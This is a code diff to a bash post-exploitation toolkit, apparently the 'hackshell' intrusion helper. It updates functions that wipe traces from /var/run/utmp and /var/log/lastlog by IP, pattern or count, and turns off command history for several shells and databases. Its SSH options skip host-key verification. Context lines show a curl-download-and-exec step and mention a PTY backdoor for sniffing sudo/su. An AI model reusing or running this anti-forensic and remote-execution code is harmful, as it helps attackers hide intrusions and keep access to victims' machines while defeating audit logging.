@@ -239,7 +239,7 @@ ssh() {
     local opts=()
     [ -z "$NOMX" ] && [ -n "$XHOME" ] && {
         [ ! -d "$XHOME" ] && hs_mkxhome
-        [ -d "$XHOME" ] && {
+        [ -d "$XHOME" ] && ssh -V -oControlPersist=15 &>/dev/null && {
             HS_INFO "Multiplexing all SSH connections over a single TCP. ${CF}[set NOMX=1 to disable]"
             opts=("-oControlMaster=auto" "-oControlPath=\"${XHOME}/.ssh-unix.%C\"" "-oControlPersist=15")
         }
@@ -1638,17 +1638,38 @@ lastlog_clean() {
     LANG=C perl -0777 -pi -e 'BEGIN{$f=shift;$r=shift;$l=length($f)>length($r)?length($f):length($r);$f.="\x00"x($l-length($f));$r.="\x00"x($l-length($r))}s/\Q$f\E/$r/g' -- "${1:?}" "${2:-""}" "${3:-/var/log/lastlog}"
 }
 
-utmp_clean() {
-    [ $# -lt 1 ] && { echo >&2 "Usage: utmp_clean 'OLD_IP' [/var/run/utmp]"; return 255; }
+utmp_clean ()
+{
+    [ $# -lt 1 ] && {
+        echo "Usage: utmp_clean 'OLD_IP|N_LAST|PATTERN' [/var/run/utmp]" 1>&2;
+        return 255
+    };
     LANG=C perl -0777 -pi -e '
         BEGIN {
-            $ip = shift;
-            $packed = pack("C4", split(/\./, $ip)) . "\x00" x 12;
+            $pat = shift;
             $s = -s $ARGV[0];
             ($reclen) = grep { $s % $_ == 0 } (384, 192, 180, 176);
             $reclen ||= 384;
+            if ($pat =~ /^\d+$/) {
+                $mode = "last";
+                $n = $pat;
+            } elsif ($pat =~ /^\d+\.\d+\.\d+\.\d+$/) {
+                $mode = "ip";
+                $packed = pack("C4", split(/\./, $pat)) . "\x00" x 12;
+            } else {
+                $mode = "str";
+            }
         }
-        s{(.{$reclen})}{index($1,$packed)!=-1?"":$1}ge
+        if ($mode eq "last") {
+            my @recs = /(.{$reclen})/gs;
+            $_ = join("", @recs[0 .. $#recs - $n]);
+        } else {
+            s{(.{$reclen})}{
+                $mode eq "ip"
+                    ? (index($1, $packed) != -1 ? "" : $1)
+                    : ($1 =~ /\Q$pat\E/ ? "" : $1)
+            }ge
+        }
     ' -- "${1:?}" "${2:-/var/run/utmp}"
 }
 
@@ -2601,32 +2622,48 @@ usb_devices() {
     now=$(awk '{print $1}' /proc/uptime | cut -d. -f1)
 
     dmesg | LANG=C perl -sne '
-        if (/\[(\d+)\.\d+\] usb ([\d.-]+): new .* device number (\d+)/) {
-            ($ts, $port, $dev) = ($1, $2, $3);
-            $devts{$dev} = $ts; $cur{$port} = $dev; $conn{$dev} = 1;
+    my ($GREEN, $RESET) = ("\033[32m", "\033[0m");
+    if (/\[(\d+)\.\d+\] usb ([\d.-]+): new .* device number (\d+)/) {
+        ($ts, $port, $dev) = ($1, $2, $3);
+        $devts{$dev} = $ts; $cur{$port} = $dev; $conn{$dev} = 1;
+        delete $disc{$dev};
+    }
+    $d = $cur{$1} if /usb ([\d.-]+): (?:Product|Manufacturer|SerialNumber):/;
+    $prod{$d}  = $1 if /Product: (.+)/;
+    $mfr{$d}   = $1 if /Manufacturer: (.+)/;
+    $ser{$d}   = $1 if /SerialNumber: (.+)/;
+    if (/\[(\d+)\.\d+\] usb ([\d.-]+): USB disconnect, device number (\d+)/) {
+        ($ts, $dev) = ($1, $3);
+        $conn{$dev} = 0;
+        $disc{$dev} = $ts;
+    }
+    END {
+        sub fmt_age {
+            my $s = shift;
+            return $s >= 86400 ? sprintf("%dd%dh%dm", int($s/86400), int($s%86400/3600), int($s%3600/60))
+                 : $s >= 3600  ? sprintf("%dh%dm", int($s/3600), int($s%3600/60))
+                 :                sprintf("%dm", int($s/60));
         }
-        $d = $cur{$1} if /usb ([\d.-]+): (?:Product|Manufacturer|SerialNumber):/;
-        $prod{$d}  = $1 if /Product: (.+)/;
-        $mfr{$d}   = $1 if /Manufacturer: (.+)/;
-        $ser{$d}   = $1 if /SerialNumber: (.+)/;
-        $conn{$1}  = 0  if /USB disconnect, device number (\d+)/;
-        END {
-            for $d (keys %ser) {
-                $s = $ser{$d};
-                next if $best{$s} && $devts{$d} <= $best{$s};
-                $best{$s} = $devts{$d};
-                @rec{$s} = [$prod{$d}, $mfr{$d}, $conn{$d}];
-            }
-            for $s (sort { $best{$b} <=> $best{$a} } keys %best) {
-                $age = $now - $best{$s};
-                $age = sprintf(
-                    $age >= 86400 ? "%dd%dh%dm" : $age >= 3600 ? "%2\$dh%3\$dm" : "%3\$dm",
-                    int($age/86400), int($age%86400/3600), int($age%3600/60)
-                );
-                $c = $rec{$s}[2] ? " \033[32m[CONNECTED]\033[0m" : "";
-                printf "%8s %s %s %s%s\n", $age, $rec{$s}[0], $rec{$s}[1], $s, $c;
-            }
+        for $d (keys %ser) {
+            next if $mfr{$d} =~ /^Linux / || $prod{$d} =~ /USB\/IP|QEMU/;
+            $s = $ser{$d};
+            next if $best{$s} && $devts{$d} <= $best{$s};
+            $best{$s}      = $devts{$d};
+            $best_disc{$s} = $disc{$d};
+            $rec{$s}       = [$prod{$d}, $mfr{$d}, $conn{$d}];
         }
+        for $s (sort { $best{$b} <=> $best{$a} } keys %best) {
+            my $extra;
+            if ($rec{$s}[2]) {
+                $extra = " \033[32m[CONNECTED]\033[0m";
+            } elsif ($best_disc{$s}) {
+                $extra = " [" . fmt_age($best_disc{$s} - $best{$s}) . " alive]";
+            } else {
+                $extra = "";
+            }
+            printf "%8s %s %s %s%s\n", fmt_age($now - $best{$s}), $rec{$s}[0], $rec{$s}[1], $s, $extra;
+        }
+    }
     ' -- -now="$now"
 }
 
@@ -2930,8 +2967,7 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
 
     HS_SSH_OPT=()
     command -v ssh >/dev/null && {
-        str="$(command ssh -V 2>&1)"
-        [[ "$str" == OpenSSH_[67]* ]] && a="no"
+        command ssh -oStrictHostKeyChecking=accept-new -V 2>/dev/null 1>/dev/null || a="no"
         HS_SSH_OPT+=("-oStrictHostKeyChecking=${a:-accept-new}")
         # HS_SSH_OPT+=("-oUpdateHostKeys=no")
         HS_SSH_OPT+=("-oUserKnownHostsFile=/dev/null")
@@ -2955,7 +2991,7 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
 
         HS_SSH_OPT+=("-oConnectTimeout=5")
         HS_SSH_OPT+=("-oServerAliveInterval=30")
-        unset str a hka pka ciphers
+        unset a hka pka ciphers
     }
 
     _hs_enc_init
@@ -3181,6 +3217,7 @@ hs_init_shell() {
     export PSQL_HISTORY=/dev/null
     export SQLITE_HISTORY=/dev/null
     export MONGODB_LOG_ALL=off
+    export ASTERISK_HISTORY=/dev/null
 
     export T=.$'\t''~?$?'".${UID}"
     # PTY backdoor to not sniff when using sudo/su.
